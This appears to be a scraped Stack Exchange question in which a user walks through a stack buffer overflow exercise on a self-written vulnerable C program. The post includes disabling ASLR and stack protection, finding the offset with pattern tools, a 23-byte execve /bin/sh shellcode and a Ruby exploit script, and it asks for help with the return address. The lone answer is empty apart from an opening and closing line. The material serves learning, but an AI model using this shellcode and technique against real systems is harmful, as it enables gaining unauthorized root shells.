{
  "title": "A buffer overflow exercise using a shellcode",
  "link": "https://reverseengineering.stackexchange.com/questions/15798/a-buffer-overflow-exercise-using-a-shellcode",
  "content": "I have been doing an exercise about a buffer overload on a C program, the goal of this problem is to get the root shell once I have inserted a shellcode into the program. This is what I have until now:\n\nSTEP 1.- Firstable let´s see my C code in the file called file.c :\n\n```\nroot@kali:~# cat ./file.c\n#include <stdio.h>\n#include <string.h>\n\nvoid premio()\n{\n     printf(\"I have altered the programs flow  \n\");\n}\n\nint main(int argc, char *argv[])\n{\n    char buffer[100];\n    if (argc != 2)\n   {\n         printf(\"Use: %s argument  \n\",argv[0]);\n         return -1;\n    }\n    strcpy(buffer,argv[1]);\n    printf (\"%s  \n\",buffer);\n    return 0;\n}\n\n```\nSTEP 2.- I have compilled it and deactivate the ASLR to avoid receiving random addresses as follows:\n\n```\ngcc -fno-stack-protector -z execstack buffer.c -o buffer\n\necho 0 > /proc/sys/kernel/randomize_va_space\n\n```\nSTEP 3.- Let´s check how it works :\n\n```\nroot@kali:~# ./file string\nstring\nroot@kali:~# ./file `ruby -e 'print \"a\"*99'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nroot@kali:~# ./file `ruby -e 'print \"a\"*100'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nroot@kali:~# ./file `ruby -e 'print \"a\"*125'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSegmentation fault  (this means we have overwritten the EIP register)\n\nroot@kali:~# gdb ./file\n(gdb) run  `ruby -e 'print \"a\"*125'`\nStarting program: /root/file `ruby -e 'print \"a\"*125'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000006161616161 in ?? () (this is the value of EIP beacuse of the letter a)\n(gdb) \n\n```\nSTEP 4.- We will find the value of the position of EIP using :\n\n```\nroot@kali:~# ./pattern_create.rb -l 125\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\nroot@kali:~# gdb ./file\n(gdb) run \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\"\nStarting program: /root/file \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\"\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000006541306541 in ?? ()\n\nroot@kali:~# ./pattern_offset.rb -q 0x0000006541306541 -l 125\n[*] Exact match at offset 120\n\nIn this case we have found that if we write 120 characters the next 5 will be EIP\n\n```\nSTEP 5.- -Now we will create a script to overwrite the buffer with the shellcode, the shellcode was taken from :\n\n```\n\\x31 \\xc0                   xor eax, eax\n\\x50                        push eax\n//PUSH /bin\n\\x68\\x2f\\x2f\\x73\\x68        push 0x68732f2f\n//PUSH //sh\n\\x68\\x2f\\x62\\x69\\x6e        push 0x6e69622f\n\\x89\\xe3                    mov ebx, esp\n\\x50                        push eax\n\\x53                        push ebx\n\\x89\\xe1                    mov ecx, esp\n\\xb0\\x0b                    mov al, 0xb\n\\xcd\\x80                    int 0x80  \n\nroot@kali:~# cat ./exploit.rb\neip = \"bbbbb\"\naes = \"a\"*97\nshell = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" #23 bytes\n\nprint (shell + aes + eip) #125 bytes total\n\n```\nSTEP 6.- Now we must know what address must jump to begin to execute our shell, but here I am stuck because I do not know how to do.\n\n```\n(gdb) set disassembly-flavor intel\n(gdb) disass main\nDump of assembler code for function main:\n   0x0000000000000753 <+0>:     push   rbp\n   0x0000000000000754 <+1>:     mov    rbp,rsp\n   0x0000000000000757 <+4>:     add    rsp,0xffffffffffffff80\n   0x000000000000075b <+8>:     mov    DWORD PTR [rbp-0x74],edi\n   0x000000000000075e <+11>:    mov    QWORD PTR [rbp-0x80],rsi\n   0x0000000000000762 <+15>:    cmp    DWORD PTR [rbp-0x74],0x2\n   0x0000000000000766 <+19>:    je     0x78a <main+55>\n   0x0000000000000768 <+21>:    mov    rax,QWORD PTR [rbp-0x80]\n   0x000000000000076c <+25>:    mov    rax,QWORD PTR [rax]\n   0x000000000000076f <+28>:    mov    rsi,rax\n   0x0000000000000772 <+31>:    lea    rdi,[rip+0xf1]        # 0x86a\n   0x0000000000000779 <+38>:    mov    eax,0x0\n   0x000000000000077e <+43>:    call   0x5f0 <printf@plt>\n   0x0000000000000783 <+48>:    mov    eax,0xffffffff\n   0x0000000000000788 <+53>:    jmp    0x7b5 <main+98>\n   0x000000000000078a <+55>:    mov    rax,QWORD PTR [rbp-0x80]\n   0x000000000000078e <+59>:    add    rax,0x8\n   0x0000000000000792 <+63>:    mov    rdx,QWORD PTR [rax]\n   0x0000000000000795 <+66>:    lea    rax,[rbp-0x70]\n   0x0000000000000799 <+70>:    mov    rsi,rdx\n   0x000000000000079c <+73>:    mov    rdi,rax\n   0x000000000000079f <+76>:    call   0x5d0 <strcpy@plt>\n   0x00000000000007a4 <+81>:    lea    rax,[rbp-0x70]\n   0x00000000000007a8 <+85>:    mov    rdi,rax\n   0x00000000000007ab <+88>:    call   0x5e0 <puts@plt>\n   0x00000000000007b0 <+93>:    mov    eax,0x0\n   0x00000000000007b5 <+98>:    leave\n   0x00000000000007b6 <+99>:    ret\nEnd of assembler dump.\n\n```\nSTEP 7.- Here is suppose to find the address to put it into the exploit script changing the value of eip but I don`t know what to do neither, sorry\n\n```\n(gdb) run `ruby exploit.rb`\nStarting program: /root/file `ruby exploit.rb`\n1▒Ph//shh/bin▒▒PS▒▒\n                   ̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000006262626262 in ?? ()\n(gdb) x/40x $esp\n0xffffffffffffe590:     Cannot access memory at address 0xffffffffffffe590\n(gdb) x/40x $rsp\n0x7fffffffe590: 0x00600000      0x00000000      0xffffe668      0x00007fff\n0x7fffffffe5a0: 0xf7b9c168      0x00000002      0x55554753      0x00005555\n0x7fffffffe5b0: 0x00000000      0x00000000      0xb3c231f4      0x54cfb08e\n0x7fffffffe5c0: 0x55554610      0x00005555      0xffffe660      0x00007fff\n0x7fffffffe5d0: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffe5e0: 0xf76231f4      0x019ae5db      0x589031f4      0x019af56f\n0x7fffffffe5f0: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffe600: 0x00000000      0x00000000      0xffffe680      0x00007fff\n0x7fffffffe610: 0xf7ffe168      0x00007fff      0xf7de875b      0x00007fff\n0x7fffffffe620: 0x00000000      0x00000000      0x00000000      0x00000000\n(gdb)\n\n```\nAt the end of all it must give me a root shell.\n\nAlmost to finish, on steps 6 and 7 I am really stuck, can you help me please?\n\n",
  "votes": "2",
  "answers": 1,
  "views": "7k",
  "tags": [
    "buffer-overflow",
    "shellcode"
  ],
  "user": "Mr. J",
  "time": "Jul 10, 2017 at 16:44",
  "comments": [],
  "answers_data": [
    {
      "content": "Okay, so I will try to answer to all your questions and add a few remarks.\n\nHope this helped you a bit...\n\n",
      "votes": "4",
      "user": "perror",
      "time": "Jul 10, 2017 at 16:33",
      "is_accepted": false,
      "comments": []
    }
  ]
}